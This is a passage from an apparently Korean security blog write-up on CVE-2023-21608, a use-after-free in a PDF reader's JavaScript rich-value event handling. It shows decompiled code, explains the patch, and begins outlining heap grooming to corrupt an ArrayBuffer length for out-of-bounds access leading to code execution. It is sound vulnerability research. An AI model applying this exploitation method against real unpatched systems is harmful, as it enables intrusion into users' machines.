&lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC744; &amp;#xBAA8;&amp;#xB450; &lt;code&gt;hashTable-&amp;gt;DefaultHead&lt;/code&gt;&amp;#xB85C; &amp;#xBCC0;&amp;#xACBD;&amp;#xD558;&amp;#xC5EC; &amp;#xBC84;&amp;#xD0B7;&amp;#xC774; &amp;#xBE44;&amp;#xC5C8;&amp;#xC74C;&amp;#xC744; &amp;#xB098;&amp;#xD0C0;&amp;#xB0C5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DeleteFromHashTable&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xBC18;&amp;#xD658;&amp;#xD55C; &amp;#xB2E4;&amp;#xC74C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;UnlinkSelf&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;UnlinkSelf&#34;&gt;&lt;a href=&#34;#UnlinkSelf&#34; class=&#34;headerlink&#34; title=&#34;UnlinkSelf&#34;&gt;&lt;/a&gt;UnlinkSelf&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-title&#34;&gt;UnlinkSelf&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a1, HashBucketEntry *target)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  HashBucketEntry *v2; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;

  v2 = target-&amp;gt;list_entry.list_entry.Flink;
  --a1[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];                                      &lt;span class=&#34;hljs-comment&#34;&gt;// decrease length&lt;/span&gt;
  target-&amp;gt;list_entry.list_entry.Blink-&amp;gt;list_entry.list_entry.Flink = v2;&lt;span class=&#34;hljs-comment&#34;&gt;// Unlink&lt;/span&gt;
  v2-&amp;gt;list_entry.list_entry.Blink = target-&amp;gt;list_entry.list_entry.Blink;
  sub_20867B89(target);                         &lt;span class=&#34;hljs-comment&#34;&gt;// free&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v2;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790; &lt;code&gt;a1&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &lt;code&gt;GlobalHashTable.DefaultHead&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; 4&amp;#xB97C; &amp;#xB354;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &lt;code&gt;length&lt;/code&gt;&amp;#xB97C; 1 &amp;#xAC10;&amp;#xC18C;&amp;#xC2DC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC81C;&amp;#xAC70;&amp;#xD558;&amp;#xACE0;&amp;#xC790; &amp;#xD558;&amp;#xB294; &amp;#xB178;&amp;#xB4DC;&amp;#xC778; &lt;code&gt;target&lt;/code&gt;&amp;#xC744; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xC81C;&amp;#xAC70;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;sub_20867B89&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;target&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; &amp;#xD574;&amp;#xC81C;&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Patched-SetRichValueEventProp-amp-GetRichValueEventProp&#34;&gt;&lt;a href=&#34;#Patched-SetRichValueEventProp-amp-GetRichValueEventProp&#34; class=&#34;headerlink&#34; title=&#34;Patched : SetRichValueEventProp &amp;amp; GetRichValueEventProp&#34;&gt;&lt;/a&gt;Patched : SetRichValueEventProp &amp;amp; GetRichValueEventProp&lt;/h2&gt;&lt;p&gt;&lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt;, &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt;, &lt;code&gt;DeleteFromGlobalHashTable&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xD638;&amp;#xCD9C;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;SetRichValueEventProp&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xB3C4; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xACFC; &amp;#xC720;&amp;#xC0AC;&amp;#xD55C; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xCD94;&amp;#xAC00;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC774; &amp;#xCD94;&amp;#xAC00;&amp;#xB428;&amp;#xC73C;&amp;#xB85C;&amp;#xC368; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xB418;&amp;#xB294;&amp;#xC9C0; &amp;#xC54C;&amp;#xC544;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;SetRichValueEventProp&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *a1, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a3)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  ...
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v7() )
  {
    ...
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v8() )
    {
      ...
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (_WORD)v34 == v16()
        || (v29 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,
            v28 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;bWillCommit&amp;quot;&lt;/span&gt;,
            v27 = v4,
            v17 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (**)(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;))(dword_2147CFA0 + &lt;span class=&#34;hljs-number&#34;&gt;196&lt;/span&gt;),
            __guard_check_icall_fptr(v4, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;bWillCommit&amp;quot;&lt;/span&gt;),
            v18 = v17(),
            (_WORD)v18) )
      {
LABEL_12:
        v29 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CAgg_P&amp;quot;&lt;/span&gt;;
        v18 = sub_20A4BC05(v4, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;);
        PointerType = (_DWORD *)v18;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v18 )
        {
          LOBYTE(v18) = IsDataInGlobalHashTable(v18);
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(_BYTE)v18 )                    &lt;span class=&#34;hljs-comment&#34;&gt;// Not in process&lt;/span&gt;
          {
            v21 = InsertToGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;PointerTypePtr, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)PointerType);
            LOBYTE(v36) = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
            CAgg::Convert((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v21, v22, PointerType, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
            sub_20AD749C((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)PointerType, v33, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;// GetRichValueEventProp called&lt;/span&gt;
            v23 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; (**)(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;))(dword_2147CFA0 + &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;);
            v29 = (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
            __guard_check_icall_fptr(v4, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;bModified&amp;quot;&lt;/span&gt;);
            v23();
            v18 = DeleteFromGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;PointerTypePtr);
          }
        }
      }
      sub_20AAE6F7(v18, v19, v35);
    }
    result = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB418;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC774; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0; &amp;#xB3D9;&amp;#xC77C;&amp;#xD558;&amp;#xAC8C; &amp;#xC801;&amp;#xC6A9;&amp;#xB420; &amp;#xACBD;&amp;#xC6B0;, &amp;#xBA3C;&amp;#xC800; &lt;code&gt;SetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt;&amp;#xC758; &amp;#xBC18;&amp;#xD658; &amp;#xAC12;&amp;#xC774; 0&amp;#xC778; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xC774; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00;&amp;#xB420; &amp;#xAC83;&amp;#xC774;&amp;#xACE0; &amp;#xC774;&amp;#xD6C4; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;sub_20AD749C&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &lt;code&gt;GetRichValueEventProp&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xACE0; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;GetRichValueEventProp&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *a1, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a3)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  ...
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v5() )
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    ...
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v31
      &amp;amp;&amp;amp; (v23 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;,
          v22 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v31,
          v11 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 (__fastcall **)(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(dword_2147CFA0 + &lt;span class=&#34;hljs-number&#34;&gt;180&lt;/span&gt;),
          v12 = __guard_check_icall_fptr(v31, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;),
          v11(v12)) )
    {
      v23 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CAgg_P&amp;quot;&lt;/span&gt;;
      PointerType = sub_20A4BC05(v31, (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;richValue&amp;quot;&lt;/span&gt;);
      PointerType_1 = PointerType;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( PointerType )
      {
        LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(_BYTE)PointerType )
        {
          v15 = InsertToGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31, PointerType_1);
          LOBYTE(v33) = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
          CAggToESVal((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v15, v16, PropName, PointerType_1);
          PointerType = DeleteFromGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31);
        }
      }
    }
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xBB34;&amp;#xB7F0; &amp;#xAC80;&amp;#xC99D; &amp;#xC5C6;&amp;#xC774; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &amp;#xC5F4;&amp;#xAC70; &amp;#xB3C4;&amp;#xC911;&amp;#xC5D0; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB4E4;&amp;#xC774; &amp;#xD574;&amp;#xC81C;&amp;#xB418;&amp;#xACE0; &amp;#xC774;&amp;#xD6C4; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC9C0;&amp;#xB9CC; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB54C;&amp;#xC758; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xC740; &lt;code&gt;SetRichValueEventProp&lt;/code&gt;&amp;#xC758; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xACFC; &amp;#xAC19;&amp;#xACE0; &lt;code&gt;SetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xC774;&amp;#xBBF8; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt;&amp;#xC740; &lt;code&gt;true&lt;/code&gt;&amp;#xB97C; &amp;#xBC18;&amp;#xD658;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB610;&amp;#xD55C; &lt;code&gt;richValue&lt;/code&gt;&amp;#xC640; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xBC84;&amp;#xADF8;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xB294; &lt;code&gt;richChange&lt;/code&gt;&amp;#xC640; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; &lt;code&gt;SetRichChangeEventProp&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC640; &lt;code&gt;GetRichChangeEventProp&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB3C4; &amp;#xAC19;&amp;#xC740; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;4-Exploitation&#34;&gt;&lt;a href=&#34;#4-Exploitation&#34; class=&#34;headerlink&#34; title=&#34;4. Exploitation&#34;&gt;&lt;/a&gt;4. Exploitation&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xB300;&amp;#xB9DD;&amp;#xC758; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xB9CC;&amp;#xC774; &amp;#xB0A8;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xC598;&amp;#xAE30;&amp;#xD55C; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xACE0; &amp;#xC774;&amp;#xC804;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8; &amp;#xC5D4;&amp;#xC9C4; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xACBD;&amp;#xD5D8;&amp;#xC774; &amp;#xC5C6;&amp;#xC5C8;&amp;#xAE30;&amp;#xC5D0; &amp;#xAD49;&amp;#xC7A5;&amp;#xD788; &amp;#xC2E0;&amp;#xC120;&amp;#xD558;&amp;#xAC8C; &amp;#xB290;&amp;#xAEF4;&amp;#xC9C0;&amp;#xAE30;&amp;#xB3C4; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%205.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;del&gt;&amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xB09C; &amp;#xD30C;&amp;#xC774;&amp;#xC36C;&amp;#xC774; &amp;#xC88B;&amp;#xC544;&lt;/del&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;RCE &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC704;&amp;#xD574; &amp;#xBA3C;&amp;#xC800; &amp;#xD799; &amp;#xADF8;&amp;#xB8E8;&amp;#xBC0D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xACF5;&amp;#xACA9;&amp;#xC790;&amp;#xAC00; &amp;#xC870;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xB54C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xD2B9;&amp;#xC815; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; length&amp;#xAC00; &amp;#xB36E;&amp;#xC5B4; &amp;#xC4F0;&amp;#xC774;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4; &amp;#xC774;&amp;#xB97C; OOB Read/Write&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;1-Create-Corrupted-ArrayBuffer&#34;&gt;&lt;a href=&#34;#1-Create-Corrupted-ArrayBuffer&#34; class=&#34;headerlink&#34; title=&#34;1. Create Corrupted ArrayBuffer&#34;&gt;&lt;/a&gt;1. Create Corrupted ArrayBuffer&lt;/h2&gt;&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; page-heap&amp;#xC774; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB41C; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &lt;code&gt;CAgg::operator[]&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;CAgg-operator&#34;&gt;&lt;a href=&#34;#CAgg-operator&#34; class=&#34;headerlink&#34; title=&#34;CAgg::operator[]&#34;&gt;&lt;/a&gt;CAgg::operator[]&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __userpurge CAgg::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[]@&amp;lt;eax&amp;gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;@&amp;lt;ecx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; *a2@&amp;lt;ebx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *someID)
{
...
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt; == &lt;span class=&#34;hljs-number&#34;&gt;0x13&lt;/span&gt; )                          &lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;type&lt;/span&gt;
  {
    v6 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (__fastcall **)(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(dword_21473CA4 + &lt;span class=&#34;hljs-number&#34;&gt;28&lt;/span&gt;);
    v7 = __guard_check_icall_fptr(someID);
    v8 = (&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *)v6(v7);
    v15 = (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)sub_20867317(v8, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
    v9 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];
    v16 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    v11 = *(_DWORD *)sub_20AA6EED((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a2a, v10, v9, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v15, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a2a);
    v16 = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v15 )
      sub_208679A2(v15);
    result = v11 + &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
